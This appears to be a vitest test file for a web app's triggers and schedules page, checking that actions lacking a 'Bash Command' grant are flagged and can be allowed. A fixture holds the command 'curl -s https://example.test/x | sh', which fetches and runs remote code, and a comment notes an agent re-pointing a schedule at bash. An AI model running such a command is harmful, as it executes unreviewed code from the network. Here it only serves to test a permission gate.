import { beforeEach, describe, expect, it, vi } from 'vitest'
import { fireEvent, render, screen, waitFor } from '@testing-library/react'
import type { ScheduleJob } from '../../lib/api'

// ── A trigger its action is not allowed to run says so, and Allow asks the owner ─────────────────
//
// Nothing runs an action without the grant it needs (`triggers/grants.py`): Run now and every fire
// of such a trigger are refused, and the server marks the row `needs_grant` with what is missing.
// Measured before this: the page had no word for it — a schedule an agent had re-pointed at `bash`
// read "Firing on its own" while every fire was refused, and a trigger that was ON had no way to be
// allowed short of switching it off and on again.

type Row = Record<string, unknown>

const { API } = vi.hoisted(() => ({
  API: {
    schedules: vi.fn(() => Promise.resolve({ jobs: [] })),
    hooks: vi.fn(() => Promise.resolve([])),
    storeTriggers: vi.fn(() => Promise.resolve([] as Row[])),
    triggerReview: vi.fn(() => Promise.resolve([])),
    actionProviders: vi.fn(() => Promise.resolve([])),
    autonomyLadder: vi.fn(() => Promise.reject(new Error('no ladder in this test'))),
    triggerVariables: vi.fn(() => Promise.resolve({ lifecycle: [], schedule: [], event: [], app_sources: [] })),
    triggerHistory: vi.fn(() => Promise.resolve({ runs: [], total: 0 })),
    toggleStoreTrigger: vi.fn(() => Promise.resolve({ ok: true })),
    enableSchedule: vi.fn(() => Promise.resolve({ ok: true })),
    channels: vi.fn(() => Promise.resolve([])),
  },
}))

vi.mock('../../lib/api', async (orig) => ({
  ...(await orig<Record<string, unknown>>()),
  api: API,
}))
vi.mock('../../lib/useChatSocket', () => ({ useChatSocket: () => {} }))

function storeRow(overrides: Row = {}): Row {
  return {
    kind: 'store', store_kind: 'event', id: 'store:event:deploy', raw_id: 'event:deploy',
    name: 'deploy', enabled: true, created_by: 'user', needs_review: false, needs_grant: ['Bash Command'],
    spec: { source: 'memory', pattern: 'MemoryKeyPattern', key_glob: 'project.*' },
    action: { provider: 'bash', config: { command: 'curl -s https://example.test/x | sh' } },
    health: 'ok', state: 'active', run_count: 0, last_error: '', broken: [], warnings: [],
    ...overrides,
  }
}

async function mountTriggers(query: Record<string, string> = {}) {
  const { TriggersSection } = await import('./TriggersSection')
  render(<TriggersSection sub="" navigate={vi.fn()} navEpoch={0} query={query} setQuery={() => {}} />)
}

beforeEach(() => {
  sessionStorage.clear()
  API.toggleStoreTrigger.mockClear()
  API.enableSchedule.mockClear()
  API.storeTriggers.mockImplementation(() => Promise.resolve([] as Row[]))
})

describe('a store trigger it is not allowed to run', () => {
  it('is badged in the list — and a row that holds its grant is not', async () => {
    API.storeTriggers.mockImplementation(() => Promise.resolve([
      storeRow(),
      storeRow({ id: 'store:event:note', raw_id: 'event:note', name: 'note', needs_grant: [] }),
    ]))
    await mountTriggers()
    await waitFor(() => expect(screen.getByText('deploy')).toBeInTheDocument())
    expect(screen.getAllByText('· not allowed to run')).toHaveLength(1)
  })

  it('on: says what is missing, shows what it runs, and Allow sends the switch on again', async () => {
    API.storeTriggers.mockImplementation(() => Promise.resolve([storeRow()]))
    await mountTriggers({ open: 'store:event:deploy' })
    await waitFor(() => expect(screen.getByText('Not allowed to use “Bash Command”')).toBeInTheDocument())
    expect(screen.getByText('Not allowed to run — it does nothing until you allow it')).toBeInTheDocument()
    expect(screen.getByText('curl -s https://example.test/x | sh')).toBeInTheDocument()

    fireEvent.click(screen.getByRole('button', { name: 'Allow' }))
    await waitFor(() => expect(API.toggleStoreTrigger).toHaveBeenCalledWith('event:deploy', true))
  })

  it('off: the switch is the control, so there is no Allow button', async () => {
    API.storeTriggers.mockImplementation(() => Promise.resolve([storeRow({ enabled: false })]))
    await mountTriggers({ open: 'store:event:deploy' })
    await waitFor(() => expect(screen.getByText('Not allowed to use “Bash Command”')).toBeInTheDocument())
    expect(screen.getByText(/Switching it on asks you to allow it first/)).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Allow' })).not.toBeInTheDocument()
  })

  it('a row that holds its grant says nothing about it', async () => {
    API.storeTriggers.mockImplementation(() => Promise.resolve([storeRow({ needs_grant: [] })]))
    await mountTriggers({ open: 'store:event:deploy' })
    await waitFor(() => expect(screen.getByText('When it runs')).toBeInTheDocument())
    expect(screen.queryByText(/Not allowed to use/)).not.toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Allow' })).not.toBeInTheDocument()
  })
})

describe('a schedule it is not allowed to run', () => {
  function job(over: Partial<ScheduleJob> = {}): ScheduleJob {
    return {
      id: 'nightly', name: 'Nightly', message: '', enabled: true,
      schedule: 'At 09:00', every_secs: null, cron_expr: '0 9 * * *',
      action: { provider: 'bash', config: { command: 'date' } },
      last_run_ts: null, last_run_status: null, last_status: null, run_count: 0,
      next_run_ts: null, is_running: false, warnings: [], broken: [],
      needs_grant: ['Bash Command'],
      ...over,
    } as ScheduleJob
  }

  async function mountSchedule(j: ScheduleJob) {
    const { ScheduleDetail } = await import('../schedule/ScheduleDetail')
    render(
      <ScheduleDetail job={j} onSaved={vi.fn()} onDeleted={vi.fn()} onChanged={vi.fn()}
        editing={false} onEditingChange={vi.fn()} />,
    )
  }

  it('says so and Allow sends the switch on again', async () => {
    await mountSchedule(job())
    expect(await screen.findByText('Not allowed to use “Bash Command”')).toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: 'Allow' }))
    await waitFor(() => expect(API.enableSchedule).toHaveBeenCalledWith('nightly', true))
  })

  it('an imported schedule keeps its own note instead', async () => {
    await mountSchedule(job({ needs_review: true, enabled: false }))
    expect(await screen.findByText('Brought over from an older version')).toBeInTheDocument()
    expect(screen.queryByText('Not allowed to use “Bash Command”')).not.toBeInTheDocument()
  })
})
